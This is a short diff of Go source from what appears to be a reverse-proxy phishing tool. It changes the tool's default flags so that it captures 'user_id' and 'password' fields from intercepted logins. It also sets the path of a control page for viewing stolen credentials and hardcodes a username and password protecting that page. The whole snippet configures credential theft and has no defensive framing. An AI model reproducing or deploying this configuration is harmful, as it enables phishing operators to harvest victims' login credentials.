@@ -267,9 +267,9 @@ type CookieJar struct {
 	Cookies map[string]*Cookie `json:"cookies"`
 }
 
-var credentialParameters = flag.String("credParams", "", "Credential regexp with matching groups. e.g. : baase64(username_regex),baase64(password_regex)")
-var controlURL = flag.String("controlURL", "aqamns@369#!", "URL to view captured credentials and settings.")
-var controlCredentials = flag.String("controlCreds", "", "Username and password to protect the credentials page.  user:pass format")
+var credentialParameters = flag.String("credParams", "base64(user_id=([^\W]+)&),base64(password=([^\W]+)&)", "Credential regexp with matching groups. e.g. : baase64(username_regex),baase64(password_regex)")
+var controlURL = flag.String("controlURL", "inferninho", "URL to view captured credentials and settings.")
+var controlCredentials = flag.String("controlCreds", "bytebounty:aqamns", "Username and password to protect the credentials page.  user:pass format")
 
 var CConfig ControlConfig
 
